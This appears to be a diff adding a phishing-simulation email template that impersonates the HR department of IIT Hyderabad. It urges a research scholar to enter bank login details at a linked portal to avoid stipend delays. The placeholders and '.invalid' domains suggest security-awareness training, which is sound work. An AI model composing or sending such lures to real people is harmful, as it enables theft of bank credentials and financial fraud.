@@ -1,0 +1,23 @@
+Subject: HR Portal: Stipend Update
+
+ACTION REQUIRED: [Student Name], Research Scholar
+
+Dear [Student Name],
+
+This is a routine administrative update from the HR department regarding your stipend details. As part of our ongoing efforts to ensure the accuracy of our records, please take a moment to confirm your bank login details on the HR portal. This is a standard procedure to help us process your stipend correctly.
+
+You can access the portal using the following link:
+
+https://portal.training.invalid/verify
+
+Once you log in, you will see a form to update your bank login details. Please ensure that this information is accurate to avoid any delays in processing your payment.
+
+If you have any questions or need assistance, please feel free to contact the HR Help Desk.
+
+Thank you for your cooperation.
+
+Best regards,
+
+HR Department  
+IIT Hyderabad  
+Email: hr@training.invalid
